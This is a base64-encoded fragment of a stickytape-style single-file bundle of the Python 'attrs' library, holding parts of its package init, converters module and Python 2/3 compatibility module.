BhdHRyID0gYXR0cmliXG5kYXRhY2xhc3MgPSBwYXJ0aWFsKGF0dHJzLCBhdXRvX2F0dHJpYnM9VHJ1ZSkgICMgaGFwcHkgRWFzdGVyIDspXG5cbl9fYWxsX18gPSBbXG4gICAgIkF0dHJpYnV0ZSIsXG4gICAgIkZhY3RvcnkiLFxuICAgICJOT1RISU5HIixcbiAgICAiYXNkaWN0IixcbiAgICAiYXNzb2MiLFxuICAgICJhc3R1cGxlIixcbiAgICAiYXR0ciIsXG4gICAgImF0dHJpYiIsXG4gICAgImF0dHJpYnV0ZXMiLFxuICAgICJhdHRycyIsXG4gICAgImNtcF91c2luZyIsXG4gICAgImNvbnZlcnRlcnMiLFxuICAgICJldm9sdmUiLFxuICAgICJleGNlcHRpb25zIixcbiAgICAiZmllbGRzIixcbiAgICAiZmllbGRzX2RpY3QiLFxuICAgICJmaWx0ZXJzIixcbiAgICAiZ2V0X3J1bl92YWxpZGF0b3JzIixcbiAgICAiaGFzIixcbiAgICAiaWIiLFxuICAgICJtYWtlX2NsYXNzIixcbiAgICAicmVzb2x2ZV90eXBlcyIsXG4gICAgInMiLFxuICAgICJzZXRfcnVuX3ZhbGlkYXRvcnMiLFxuICAgICJzZXR0ZXJzIixcbiAgICAidmFsaWRhdGUiLFxuICAgICJ2YWxpZGF0b3JzIixcbl1cblxuaWYgc3lzLnZlcnNpb25faW5mb1s6Ml0gPj0gKDMsIDYpOlxuICAgIGZyb20gLl9uZXh0X2dlbiBpbXBvcnQgZGVmaW5lLCBmaWVsZCwgZnJvemVuLCBtdXRhYmxlICAjIG5vcWE6IEY0MDFcblxuICAgIF9fYWxsX18uZXh0ZW5kKCgiZGVmaW5lIiwgImZpZWxkIiwgImZyb3plbiIsICJtdXRhYmxlIikpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci9jb252ZXJ0ZXJzLnB5JywgYicjIFNQRFgtTGljZW5zZS1JZGVudGlmaWVyOiBNSVRcblxuIiIiXG5Db21tb25seSB1c2VmdWwgY29udmVydGVycy5cbiIiIlxuXG5mcm9tIF9fZnV0dXJlX18gaW1wb3J0IGFic29sdXRlX2ltcG9ydCwgZGl2aXNpb24sIHByaW50X2Z1bmN0aW9uXG5cbmZyb20gLl9jb21wYXQgaW1wb3J0IFBZMlxuZnJvbSAuX21ha2UgaW1wb3J0IE5PVEhJTkcsIEZhY3RvcnksIHBpcGVcblxuXG5pZiBub3QgUFkyOlxuICAgIGltcG9ydCBpbnNwZWN0XG4gICAgaW1wb3J0IHR5cGluZ1xuXG5cbl9fYWxsX18gPSBbXG4gICAgImRlZmF1bHRfaWZfbm9uZSIsXG4gICAgIm9wdGlvbmFsIixcbiAgICAicGlwZSIsXG4gICAgInRvX2Jvb2wiLFxuXVxuXG5cbmRlZiBvcHRpb25hbChjb252ZXJ0ZXIpOlxuICAgICIiIlxuICAgIEEgY29udmVydGVyIHRoYXQgYWxsb3dzIGFuIGF0dHJpYnV0ZSB0byBiZSBvcHRpb25hbC4gQW4gb3B0aW9uYWwgYXR0cmlidXRlXG4gICAgaXMgb25lIHdoaWNoIGNhbiBiZSBzZXQgdG8gYGBOb25lYGAuXG5cbiAgICBUeXBlIGFubm90YXRpb25zIHdpbGwgYmUgaW5mZXJyZWQgZnJvbSB0aGUgd3JhcHBlZCBjb252ZXJ0ZXJcJ3MsIGlmIGl0XG4gICAgaGFzIGFueS5cblxuICAgIDpwYXJhbSBjYWxsYWJsZSBjb252ZXJ0ZXI6IHRoZSBjb252ZXJ0ZXIgdGhhdCBpcyB1c2VkIGZvciBub24tYGBOb25lYGBcbiAgICAgICAgdmFsdWVzLlxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTcuMS4wXG4gICAgIiIiXG5cbiAgICBkZWYgb3B0aW9uYWxfY29udmVydGVyKHZhbCk6XG4gICAgICAgIGlmIHZhbCBpcyBOb25lOlxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcbiAgICAgICAgcmV0dXJuIGNvbnZlcnRlcih2YWwpXG5cbiAgICBpZiBub3QgUFkyOlxuICAgICAgICBzaWcgPSBOb25lXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHNpZyA9IGluc3BlY3Quc2lnbmF0dXJlKGNvbnZlcnRlcilcbiAgICAgICAgZXhjZXB0IChWYWx1ZUVycm9yLCBUeXBlRXJyb3IpOiAgIyBpbnNwZWN0IGZhaWxlZFxuICAgICAgICAgICAgcGFzc1xuICAgICAgICBpZiBzaWc6XG4gICAgICAgICAgICBwYXJhbXMgPSBsaXN0KHNpZy5wYXJhbWV0ZXJzLnZhbHVlcygpKVxuICAgICAgICAgICAgaWYgcGFyYW1zIGFuZCBwYXJhbXNbMF0uYW5ub3RhdGlvbiBpcyBub3QgaW5zcGVjdC5QYXJhbWV0ZXIuZW1wdHk6XG4gICAgICAgICAgICAgICAgb3B0aW9uYWxfY29udmVydGVyLl9fYW5ub3RhdGlvbnNfX1sidmFsIl0gPSB0eXBpbmcuT3B0aW9uYWxbXG4gICAgICAgICAgICAgICAgICAgIHBhcmFtc1swXS5hbm5vdGF0aW9uXG4gICAgICAgICAgICAgICAgXVxuICAgICAgICAgICAgaWYgc2lnLnJldHVybl9hbm5vdGF0aW9uIGlzIG5vdCBpbnNwZWN0LlNpZ25hdHVyZS5lbXB0eTpcbiAgICAgICAgICAgICAgICBvcHRpb25hbF9jb252ZXJ0ZXIuX19hbm5vdGF0aW9uc19fWyJyZXR1cm4iXSA9IHR5cGluZy5PcHRpb25hbFtcbiAgICAgICAgICAgICAgICAgICAgc2lnLnJldHVybl9hbm5vdGF0aW9uXG4gICAgICAgICAgICAgICAgXVxuXG4gICAgcmV0dXJuIG9wdGlvbmFsX2NvbnZlcnRlclxuXG5cbmRlZiBkZWZhdWx0X2lmX25vbmUoZGVmYXVsdD1OT1RISU5HLCBmYWN0b3J5PU5vbmUpOlxuICAgICIiIlxuICAgIEEgY29udmVydGVyIHRoYXQgYWxsb3dzIHRvIHJlcGxhY2UgYGBOb25lYGAgdmFsdWVzIGJ5ICpkZWZhdWx0KiBvciB0aGVcbiAgICByZXN1bHQgb2YgKmZhY3RvcnkqLlxuXG4gICAgOnBhcmFtIGRlZmF1bHQ6IFZhbHVlIHRvIGJlIHVzZWQgaWYgYGBOb25lYGAgaXMgcGFzc2VkLiBQYXNzaW5nIGFuIGluc3RhbmNlXG4gICAgICAgb2YgYGF0dHJzLkZhY3RvcnlgIGlzIHN1cHBvcnRlZCwgaG93ZXZlciB0aGUgYGB0YWtlc19zZWxmYGAgb3B0aW9uXG4gICAgICAgaXMgKm5vdCouXG4gICAgOnBhcmFtIGNhbGxhYmxlIGZhY3Rvcnk6IEEgY2FsbGFibGUgdGhhdCB0YWtlcyBubyBwYXJhbWV0ZXJzIHdob3NlIHJlc3VsdFxuICAgICAgIGlzIHVzZWQgaWYgYGBOb25lYGAgaXMgcGFzc2VkLlxuXG4gICAgOnJhaXNlcyBUeXBlRXJyb3I6IElmICoqbmVpdGhlcioqICpkZWZhdWx0KiBvciAqZmFjdG9yeSogaXMgcGFzc2VkLlxuICAgIDpyYWlzZXMgVHlwZUVycm9yOiBJZiAqKmJvdGgqKiAqZGVmYXVsdCogYW5kICpmYWN0b3J5KiBhcmUgcGFzc2VkLlxuICAgIDpyYWlzZXMgVmFsdWVFcnJvcjogSWYgYW4gaW5zdGFuY2Ugb2YgYGF0dHJzLkZhY3RvcnlgIGlzIHBhc3NlZCB3aXRoXG4gICAgICAgYGB0YWtlc19zZWxmPVRydWVgYC5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE4LjIuMFxuICAgICIiIlxuICAgIGlmIGRlZmF1bHQgaXMgTk9USElORyBhbmQgZmFjdG9yeSBpcyBOb25lOlxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoIk11c3QgcGFzcyBlaXRoZXIgYGRlZmF1bHRgIG9yIGBmYWN0b3J5YC4iKVxuXG4gICAgaWYgZGVmYXVsdCBpcyBub3QgTk9USElORyBhbmQgZmFjdG9yeSBpcyBub3QgTm9uZTpcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgIk11c3QgcGFzcyBlaXRoZXIgYGRlZmF1bHRgIG9yIGBmYWN0b3J5YCBidXQgbm90IGJvdGguIlxuICAgICAgICApXG5cbiAgICBpZiBmYWN0b3J5IGlzIG5vdCBOb25lOlxuICAgICAgICBkZWZhdWx0ID0gRmFjdG9yeShmYWN0b3J5KVxuXG4gICAgaWYgaXNpbnN0YW5jZShkZWZhdWx0LCBGYWN0b3J5KTpcbiAgICAgICAgaWYgZGVmYXVsdC50YWtlc19zZWxmOlxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcbiAgICAgICAgICAgICAgICAiYHRha2VzX3NlbGZgIGlzIG5vdCBzdXBwb3J0ZWQgYnkgZGVmYXVsdF9pZl9ub25lLiJcbiAgICAgICAgICAgIClcblxuICAgICAgICBkZWYgZGVmYXVsdF9pZl9ub25lX2NvbnZlcnRlcih2YWwpOlxuICAgICAgICAgICAgaWYgdmFsIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgICAgIHJldHVybiB2YWxcblxuICAgICAgICAgICAgcmV0dXJuIGRlZmF1bHQuZmFjdG9yeSgpXG5cbiAgICBlbHNlOlxuXG4gICAgICAgIGRlZiBkZWZhdWx0X2lmX25vbmVfY29udmVydGVyKHZhbCk6XG4gICAgICAgICAgICBpZiB2YWwgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAgICAgcmV0dXJuIHZhbFxuXG4gICAgICAgICAgICByZXR1cm4gZGVmYXVsdFxuXG4gICAgcmV0dXJuIGRlZmF1bHRfaWZfbm9uZV9jb252ZXJ0ZXJcblxuXG5kZWYgdG9fYm9vbCh2YWwpOlxuICAgICIiIlxuICAgIENvbnZlcnQgImJvb2xlYW4iIHN0cmluZ3MgKGUuZy4sIGZyb20gZW52LiB2YXJzLikgdG8gcmVhbCBib29sZWFucy5cblxuICAgIFZhbHVlcyBtYXBwaW5nIHRvIDpjb2RlOmBUcnVlYDpcblxuICAgIC0gOmNvZGU6YFRydWVgXG4gICAgLSA6Y29kZTpgInRydWUiYCAvIDpjb2RlOmAidCJgXG4gICAgLSA6Y29kZTpgInllcyJgIC8gOmNvZGU6YCJ5ImBcbiAgICAtIDpjb2RlOmAib24iYFxuICAgIC0gOmNvZGU6YCIxImBcbiAgICAtIDpjb2RlOmAxYFxuXG4gICAgVmFsdWVzIG1hcHBpbmcgdG8gOmNvZGU6YEZhbHNlYDpcblxuICAgIC0gOmNvZGU6YEZhbHNlYFxuICAgIC0gOmNvZGU6YCJmYWxzZSJgIC8gOmNvZGU6YCJmImBcbiAgICAtIDpjb2RlOmAibm8iYCAvIDpjb2RlOmAibiJgXG4gICAgLSA6Y29kZTpgIm9mZiJgXG4gICAgLSA6Y29kZTpgIjAiYFxuICAgIC0gOmNvZGU6YDBgXG5cbiAgICA6cmFpc2VzIFZhbHVlRXJyb3I6IGZvciBhbnkgb3RoZXIgdmFsdWUuXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMS4zLjBcbiAgICAiIiJcbiAgICBpZiBpc2luc3RhbmNlKHZhbCwgc3RyKTpcbiAgICAgICAgdmFsID0gdmFsLmxvd2VyKClcbiAgICB0cnV0aHkgPSB7VHJ1ZSwgInRydWUiLCAidCIsICJ5ZXMiLCAieSIsICJvbiIsICIxIiwgMX1cbiAgICBmYWxzeSA9IHtGYWxzZSwgImZhbHNlIiwgImYiLCAibm8iLCAibiIsICJvZmYiLCAiMCIsIDB9XG4gICAgdHJ5OlxuICAgICAgICBpZiB2YWwgaW4gdHJ1dGh5OlxuICAgICAgICAgICAgcmV0dXJuIFRydWVcbiAgICAgICAgaWYgdmFsIGluIGZhbHN5OlxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXG4gICAgZXhjZXB0IFR5cGVFcnJvcjpcbiAgICAgICAgIyBSYWlzZWQgd2hlbiAidmFsIiBpcyBub3QgaGFzaGFibGUgKGUuZy4sIGxpc3RzKVxuICAgICAgICBwYXNzXG4gICAgcmFpc2UgVmFsdWVFcnJvcigiQ2Fubm90IGNvbnZlcnQgdmFsdWUgdG8gYm9vbDoge30iLmZvcm1hdCh2YWwpKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2F0dHIvX2NvbXBhdC5weScsIGInIyBTUERYLUxpY2Vuc2UtSWRlbnRpZmllcjogTUlUXG5cbmZyb20gX19mdXR1cmVfXyBpbXBvcnQgYWJzb2x1dGVfaW1wb3J0LCBkaXZpc2lvbiwgcHJpbnRfZnVuY3Rpb25cblxuaW1wb3J0IHBsYXRmb3JtXG5pbXBvcnQgc3lzXG5pbXBvcnQgdGhyZWFkaW5nXG5pbXBvcnQgdHlwZXNcbmltcG9ydCB3YXJuaW5nc1xuXG5cblBZMiA9IHN5cy52ZXJzaW9uX2luZm9bMF0gPT0gMlxuUFlQWSA9IHBsYXRmb3JtLnB5dGhvbl9pbXBsZW1lbnRhdGlvbigpID09ICJQeVB5IlxuUFkzNiA9IHN5cy52ZXJzaW9uX2luZm9bOjJdID49ICgzLCA2KVxuSEFTX0ZfU1RSSU5HUyA9IFBZMzZcblBZMzEwID0gc3lzLnZlcnNpb25faW5mb1s6Ml0gPj0gKDMsIDEwKVxuXG5cbmlmIFBZUFkgb3IgUFkzNjpcbiAgICBvcmRlcmVkX2RpY3QgPSBkaWN0XG5lbHNlOlxuICAgIGZyb20gY29sbGVjdGlvbnMgaW1wb3J0IE9yZGVyZWREaWN0XG5cbiAgICBvcmRlcmVkX2RpY3QgPSBPcmRlcmVkRGljdFxuXG5cbmlmIFBZMjpcbiAgICBmcm9tIGNvbGxlY3Rpb25zIGltcG9ydCBNYXBwaW5nLCBTZXF1ZW5jZVxuXG4gICAgZnJvbSBVc2VyRGljdCBpbXBvcnQgSXRlcmFibGVVc2VyRGljdFxuXG4gICAgIyBXZSBcJ2J1bmRsZVwnIGlzY2xhc3MgaW5zdGVhZCBvZiB1c2luZyBpbnNwZWN0IGFzIGltcG9ydGluZyBpbnNwZWN0IGlzXG4gICAgIyBmYWlybHkgZXhwZW5zaXZlIChvcmRlciBvZiAxMC0xNSBtcyBmb3IgYSBtb2Rlcm4gbWFjaGluZSBpbiAyMDE2KVxuICAgIGRlZiBpc2NsYXNzKGtsYXNzKTpcbiAgICAgICAgcmV0dXJuIGlzaW5zdGFuY2Uoa2xhc3MsICh0eXBlLCB0eXBlcy5DbGFzc1R5cGUpKVxuXG4gICAgZGVmIG5ld19jbGFzcyhuYW1lLCBiYXNlcywga3dkcywgZXhlY19ib2R5KTpcbiAgICAgICAgIiIiXG4gICAgICAgIEEgbWluaW1hbCBzdHViIG9mIHR5cGVzLm5ld19jbGFzcyB0aGF0IHdlIG5lZWQgZm9yIG1ha2VfY2xhc3MuXG4gICAgICAgICIiIlxuICAgICAgICBucyA9IHt9XG4gICAgICAgIGV4ZWNfYm9keShucylcblxuICAgICAgICByZXR1cm4gdHlwZShuYW1lLCBiYXNlcywgbnMpXG5cbiAgICAjIFRZUEUgaXMgdXNlZCBpbiBleGNlcHRpb25zLCByZXByKGludCkgaXMgZGlmZmVyZW50IG9uIFB5dGhvbiAyIGFuZCAzLlxuICAgIFRZUEUgPSAidHlwZSJcblxuICAgIGRlZiBpdGVyaXRlbXMoZCk6XG4gICAgICAgIHJldHVybiBkLml0ZXJpdGVtcygpXG5cbiAgICAjIFB5dGhvbiAyIGlzIGJlcmVmdCBvZiBhIHJlYWQtb25seSBkaWN0IHByb3h5LCBzbyB3ZSBtYWtlIG9uZSFcbiAgICBjbGFzcyBSZWFkT25seURpY3QoSXRlcmFibGVVc2VyRGljdCk6XG4gICAgICAgICIiIlxuICAgICAgICBCZXN0LWVmZm9ydCByZWFkLW9ubHkgZGljdCB3cmFwcGVyLlxuICAgICAgICAiIiJcblxuICAgICAgICBkZWYgX19zZXRpdGVtX18oc2VsZiwga2V5LCB2YWwpOlxuICAgICAgICAgICAgIyBXZSBnZW50bHkgcHJldGVuZCB3ZVwncmUgYSBQeXRob24gMyBtYXBwaW5ncHJveHkuXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlwnbWFwcGluZ3Byb3h5XCcgb2JqZWN0IGRvZXMgbm90IHN1cHBvcnQgaXRlbSBhc3NpZ25tZW50IlxuICAgICAgICAgICAgKVxuXG4gICAgICAgIGRlZiB1cGRhdGUoc2VsZiwgXyk6XG4gICAgICAgICAgICAjIFdlIGdlbnRseSBwcmV0ZW5kIHdlXCdyZSBhIFB5dGhvbiAzIG1hcHBpbmdwcm94eS5cbiAgICAgICAgICAgIHJhaXNlIEF0dHJpYnV0ZUVycm9yKFxuICAgICAgICAgICAgICAgICJcJ21hcHBpbmdwcm94eVwnIG9iamVjdCBoYXMgbm8gYXR0cmlidXRlIFwndXBkYXRlXCciXG4gICAgICAgICAgICApXG5cbiAgICAgICAgZGVmIF9fZGVsaXRlbV9fKHNlbGYsIF8pOlxuICAgICAgICAgICAgIyBXZSBnZW50bHkgcHJldGVuZCB3ZVwncmUgYSBQeXRob24gMyBtYXBwaW5ncHJveHkuXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlwnbWFwcGluZ3Byb3h5XCcgb2JqZWN0IGRvZXMgbm90IHN1cHBvcnQgaXRlbSBkZWxldGlvbiJcbiAgICAgICAgICAgIClcblxuICAgICAgICBkZWYgY2xlYXIoc2VsZik6XG4gICAgICAgICAgICAjIFdlIGdlbnRseSBwcmV0ZW5kIHdlXCdyZSBhIFB5dGhvbiAzIG1hcHBpbmdwcm94eS5cbiAgICAgICAgICAgIHJhaXNlIEF0dHJpYnV0ZUVycm9yKFxuICAgICAgICAgICAgICAgICJcJ21hcHBpbmdwcm94eVwnIG9iamVjdCBoYXMgbm8gYXR0cmlidXRlIFwnY2xlYXJcJyJcbiAgICAgICAgICAgIClcblxuICAgICAgICBkZWYgcG9wKHNlbGYsIGtleSwgZGVmYXVsdD1Ob25lKTpcbiAgICAgICAgICAgICMgV2UgZ2VudGx5IHByZXRlbmQgd2VcJ3JlIGEgUHl0aG9uIDMgbWFwcGluZ3Byb3h5LlxuICAgICAgICAgICAgcmFpc2UgQXR0cmlidXRlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlwnbWFwcGluZ3Byb3h5XCcgb2JqZWN0IGhhcyBubyBhdHRyaWJ1dGUgXCdwb3BcJyJcbiAgICAgICAgICAgIClcblxuICAgICAgICBkZWYgcG9waXRlbShzZWxmKTpcbiAgICAgICAgICAgICMgV2UgZ2VudGx5IHByZXRlbmQgd2VcJ3JlIGEgUHl0aG9uIDMgbWFwcGluZ3Byb3h5LlxuICAgICAgICAgICAgcmFpc2UgQXR0cmlidXRlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlwnbWFwcGluZ3Byb3h5XCcgb2JqZWN0IGhhcyBubyBhdHRyaWJ1dGUgXCdwb3BpdGVtXCciXG4gICAgICAgICAgICApXG5cbiAgICAgICAgZGVmIHNldGRlZmF1bHQoc2VsZiwga2V5LCBkZWZhdWx0PU5vbmUpOlxuICAgICAgICAgICAgIyBXZSBnZW50bHkgcHJldGVuZCB3ZVwncmUgYSBQeXRob24gMyBtYXBwaW5ncHJveHkuXG4gICAgICAgICAgICByYWlzZSBBdHRyaWJ1dGVFcnJvcihcbiAgICAgICAgICAgICAgICAiXCdtYXBwaW5ncHJveHlcJyBvYmplY3QgaGFzIG5vIGF0dHJpYnV0ZSBcJ3NldGRlZmF1bHRcJyJcbiAgICAgICAgICAgIClcblxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICAjIE92ZXJyaWRlIHRvIGJlIGlkZW50aWNhbCB0byB0aGUgUHl0aG9uIDMgdmVyc2lvbi5cbiAgICAgICAgICAgIHJldHVybiAibWFwcGluZ3Byb3h5KCIgKyByZXByKHNlbGYuZGF0YSkgKyAiKSJcblxuICAgIGRlZiBtZXRhZGF0YV9wcm94eShkKTpcbiAgICAgICAgcmVzID0gUmVhZE9ubHlEaWN0KClcbiAgICAgICAgcmVzLmRhdGEudXBkYXRlKGQpICAjIFdlIGJsb2NrZWQgdXBkYXRlLCBzbyB3ZSBoYXZlIHRvIGRvIGl0IGxpa2UgdGhpcy5cbiAgICAgICAgcmV0dXJuIHJlc1xuXG4gICAgZGVmIGp1c3Rfd2FybigqYXJncywgKiprdyk6ICAjIHByYWdtYTogbm8gY292ZXJcbiAgICAgICAgIiIiXG4gICAgICAgIFdlIG9ubHkgd2FybiBvbiBQeXRob24gMyBiZWNhdXNlIHdlIGFyZSBub3QgYXdhcmUgb2YgYW55IGNvbmNyZXRlXG4gICAgICAgIGNvbnNlcXVlbmNlcyBvZiBub3Qgc2V0dGluZyB0aGUgY2VsbCBvbiBQeXRob24gMi5cbiAgICAgICAgIiIiXG5cbmVsc2U6ICAjIFB5dGhvbiAzIGFuZCBsYXRlci5cbiAgICBmcm9tIGNvbGxlY3Rpb25zLmFiYyBpbXBvcnQgTWFwcGluZywgU2VxdWVuY2UgICMgbm9xYVxuXG4gICAgZGVmIGp1c3Rfd2FybigqYXJncywgKiprdyk6XG4gICAgICAgICIiIlxuICAgICAgICBXZSBvbmx5IHdhcm4gb24gUHl0aG9uIDMgYmVjYXVzZSB3ZSBhcmUgbm90IGF3YXJlIG9mIGFueSBjb25jcmV0ZVxuICAgICAgICBjb25zZXF1ZW5jZXMgb2Ygbm90IHNldHRpbmcgdGhlIGNlbGwgb24gUHl0aG9uIDIuXG4gICAgICAgICIiIlxuICAgICAgICB3YXJuaW5ncy53YXJuKFxuICAgICAgICAgICAgIlJ1bm5pbmcgaW50ZXJwcmV0ZXIgZG9lc25cJ3Qgc3VmZmljaWVudGx5IHN1cHBvcnQgY29kZSBvYmplY3QgIlxuICAgICAgICAgICAgImludHJvc3BlY3Rpb24uICBTb21lIGZlYXR1cmVzIGxpa2UgYmFyZSBzdXBlcigpIG9yIGFjY2Vzc2luZyAiXG4gICAgICAgICAgICAiX19jbGFzc19fIHdpbGwgbm90IHdvcmsgd2l0aCBzbG90dGVkIGNsYXNzZXMuIixcbiAgICAgICAgICAgIFJ1bnRpbWVXYXJuaW5nLFxuICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxuICAgICAgICApXG5cbiAgICBkZWYgaXNjbGFzcyhrbGFzcyk6XG4gICAgICAgIHJldHVybiBpc2luc3RhbmNlKGtsYXNzLCB0eXBlKVxuXG4gICAgVFlQRSA9ICJjbGFzcyJcblxuICAgIGRlZiBpdGVyaXRlbXMoZCk6XG4gICAgICAgIHJldHVybiBkLml0ZW1zKClcblxuICAgIG5ld19jbGFzcyA9IHR5cGVzLm5ld19jbGFzc1xuXG4gICAgZGVmIG1ldGFkYXRhX3Byb3h5KGQpOlxuICAgICAgICByZXR1cm4gdHlwZXMuTWFwcGluZ1Byb3h5VHlwZShkaWN0KGQpKVxuXG5cbmRlZiBtYWtlX3NldF9jbG9zdXJlX2NlbGwoKTpcbiAgICAiIiJSZXR1cm4gYSBmdW5jdGlvbiBvZiB0d28gYXJndW1lbnRzIChjZWxsLCB2YWx1ZSkgd2hpY2ggc2V0c1xuICAgIHRoZSB2YWx1ZSBzdG9yZWQgaW4gdGhlIGNsb3N1cmUgY2VsbCBgY2VsbGAgdG8gYHZhbHVlYC5cbiAgICAiIiJcbiAgICAjIHB5cHkgbWFrZXMgdGhpcyBlYXN5LiAoSXQgYWxzbyBzdXBwb3J0cyB0aGUgbG9naWMgYmVsb3csIGJ1dFxuICAgICMgd2h5IG5vdCBkbyB0aGUgZWFzeS9mYXN0IHRoaW5nPylcbiAgICBpZiBQWVBZOlxuXG4gICAgICAgIGRlZiBzZXRfY2xvc3VyZV9jZWxsKGNlbGwsIHZhbHVlKTpcbiAgICAgICAgICAgIGNlbGwuX19zZXRzdGF0ZV9fKCh2YWx1ZSwpKVxuXG4gICAgICAgIHJldHVybiBzZXRfY2xvc3VyZV9jZWxsXG5cbiAgICAjIE90aGVyd2lzZSBnb3R0YSBkbyBpdCB0aGUgaGFyZCB3YXkuXG5cbiAgICAjIENyZWF0ZSBhIGZ1bmN0aW9uIHRoYXQgd2lsbCBzZXQgaXRzIGZpcnN0IGNlbGx2YXIgdG8gYHZhbHVlYC5cbiAgICBkZWYgc2V0X2ZpcnN0X2NlbGx2YXJfdG8odmFsdWUpOlxuICAgICAgICB4ID0gdmFsdWVcbiAgICAgICAgcmV0dXJuXG5cbiAgICAgICAgIyBUaGlzIGZ1bmN0aW9uIHdpbGwgYmUgZWxpbWluYXRlZCBhcyBkZWFkIGNvZGUsIGJ1dFxuICAgICAgICAjIG5vdCBiZWZvcmUgaXRzIHJlZmVyZW5jZSB0byBgeGAgZm9yY2VzIGB4YCB0byBiZVxuICAgICAgICAjIHJlcHJlc2VudGVkIGFzIGEgY2xvc3VyZSBjZWxsIHJhdGhlciB0aGFuIGEgbG9jYWwuXG4gICAgICAgIGRlZiBmb3JjZV94X3RvX2JlX2FfY2VsbCgpOiAgIyBwcmFnbWE6IG5vIGNvdmVyXG4gICAgICAgICAgICByZXR1cm4geFxuXG4gICAgdHJ5OlxuICAgICAgICAjIEV4dHJhY3QgdGhlIGNvZGUgb2JqZWN0IGFuZCBtYWtlIHN1cmUgb3VyIGFzc3VtcHRpb25zIGFib3V0XG4gICAgICAgICMgdGhlIGNsb3N1cmUgYmVoYXZpb3IgYXJlIGNvcnJlY3QuXG4gICAgICAgIGlmIFBZMjpcbiAgICAgICAgICAgIGNvID0gc2V0X2ZpcnN0X2NlbGx2YXJfdG8uZnVuY19jb2RlXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBjbyA9IHNldF9maXJzdF9jZWxsdmFyX3RvLl9fY29kZV9fXG4gICAgICAgIGlmIGNvLmNvX2NlbGx2YXJzICE9ICgieCIsKSBvciBjby5jb19mcmVldmFycyAhPSAoKTpcbiAgICAgICAgICAgIHJhaXNlIEFzc2VydGlvbkVycm9yICAjIHByYWdtYTogbm8gY292ZXJcblxuICAgICAgICAjIENvbnZlcnQgdGhpcyBjb2RlIG9iamVjdCB0byBhIGNvZGUgb2JqZWN0IHRoYXQgc2V0cyB0aGVcbiAgICAgICAgIyBmdW5jdGlvblwncyBmaXJzdCBfZnJlZXZhcl8gKG5vdCBjZWxsdmFyKSB0byB0aGUgYXJndW1lbnQuXG4gICAgICAgIGlmIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDgpOlxuICAgICAgICAgICAgIyBDUHl0aG9uIDMuOCsgaGFzIGFuIGluY29tcGF0aWJsZSBDb2RlVHlwZSBzaWduYXR1cmVcbiAgICAgICAgICAgICMgKGFkZGVkIGEgcG9zb25seWFyZ2NvdW50IGFyZ3VtZW50KSBidXQgYWxzbyBhZGRlZFxuICAgICAgICAgICAgIyBDb2RlVHlwZS5yZXBsYWNlKCkgdG8gZG8gdGhpcyB3aXRob3V0IGNvdW50aW5nIHBhcmFtZXRlcnMuXG4gICAgICAgICAgICBzZXRfZmlyc3RfZnJlZXZhcl9jb2RlID0gY28ucmVwbGFjZShcbiAgICAgICAgICAgICAgICBjb19jZWxsdmFycz1jby5jb19mcmVldmFycywgY29fZnJlZXZhcnM9Y28uY29fY2VsbHZhcnNcbiAgICAgICAgICAgIClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGFyZ3MgPSBbY28uY29fYXJnY291bnRdXG4gICAgICAgICAgICBpZiBub3QgUFkyOlxuICAgICAgICAgICAgICAgIGFyZ3MuYXBwZW5kKGNvLmNvX2t3b25seWFyZ2NvdW50KVxuICAgICAgICAgICAgYXJncy5leHRlbmQoXG4gICAgICAgICAgICAgICAgW1xuICAgICAgICAgICAgICAgICAgICBjby5jb19ubG9jYWxzLFxuICAgICAgICAgICAgICAgICAgICBjby5jb19zdGFja3NpemUsXG4gICAgICAgICAgICAgICAgICAgIGNvLmNvX2ZsYWdzLFxuICAgICAgICAgICAgICAgICAgICBjby5jb19jb2RlLFxuICAgICAgICAgICAgICAgICAgICBjby5jb19jb25zdHMsXG4gICAgICAgICAgICAgICAgICAgIGNvLmNvX25hbWVzLFxuICAgICAgICAgICAgICAgICAgICBjby5jb192YXJuYW1lcyxcbiAgICAgICAgICAgICAgICAgICAgY28uY29fZmlsZW5hbWUsXG4gICAgICAgICAgICAgICAgICAgIGNvLmNvX25hbWUsXG4gICAgICAgICAgICAgICAgICAgIGNvLmNvX2ZpcnN0bGluZW5vLFxuICAgICAgICAgICAgICAgICAgICBjby5jb19sbm90YWIsXG4gICAgICAgICAgICAgICAgICAgICMgVGhlc2UgdHdvIGFyZ3VtZW50cyBhcmUgcmV2ZXJzZWQ6XG4gICAgICAgICAgICAgICAgICAgIGNvLmNvX2NlbGx2YXJzLFxuICAgICAgICAgICAgICAgICAgICBjby5jb19mcmVldmFycyxcbiAgICAgICAgICAgICAgICBdXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBzZXRfZmlyc3RfZnJlZXZhcl9jb2RlID0gdHlwZXMuQ29kZVR5cGUoKmFyZ3MpXG5cbiAgICAgICAgZGVmIHNldF9jbG9zdXJlX2NlbGwoY2VsbCwgdmFsdWUpOlxuICAgICAgICAgICAgIyBDcmVhdGUgYSBmdW5jdGlvbiB1c2luZyB0aGUgc2V0X2ZpcnN0X2ZyZWV2YXJfY29kZSxcbiAgICAgICAgICAgICMgd2hvc2UgZmlyc3QgY2xvc3VyZSBjZWxsIGlzIGBjZWxsYC4gQ2FsbGluZyBpdCB3aWxsXG4gICAgIC